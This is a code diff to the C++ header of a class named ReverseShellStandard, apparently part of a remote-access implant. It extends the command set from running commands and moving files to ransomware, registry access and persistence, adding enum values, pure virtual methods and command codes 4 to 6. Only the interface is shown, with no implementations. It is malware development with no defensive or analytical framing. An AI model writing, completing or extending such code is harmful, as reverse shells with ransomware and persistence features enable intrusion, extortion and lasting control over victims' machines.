@@ -13,7 +13,7 @@ class ReverseShellStandard
 	#define DEFAULT_BUFFER_SIZE 1024
 
 protected:
-	enum OperationType { RUN_COMMAND = 1, DOWNLOAD_FILE, UPLOAD_FILE, INVALID };
+	enum OperationType { RUN_COMMAND = 1, DOWNLOAD_FILE, UPLOAD_FILE, RANSOMWARE, REGISTRY_OPERATION, PERSISTENCE, INVALID };
 
 	ReverseShellStandard();
 	~ReverseShellStandard();
@@ -32,6 +32,9 @@ protected:
 	virtual void RunCommand() = 0;
 	virtual void DownloadFile() = 0;
 	virtual void UploadFile() = 0;
+	virtual void RunRansomware() = 0;
+	virtual void AccessRegistry() = 0;
+	virtual void CreatePersistence() = 0;
 	virtual void InvalidOperation() = 0;
 
 private:
@@ -51,7 +54,10 @@ protected:
 	{
 		{"1", RUN_COMMAND},
 		{"2", DOWNLOAD_FILE},
-		{"3", UPLOAD_FILE}
+		{"3", UPLOAD_FILE},
+		{"4", RANSOMWARE},
+		{"5", REGISTRY_OPERATION},
+		{"6", PERSISTENCE}
 	};
 
 public:
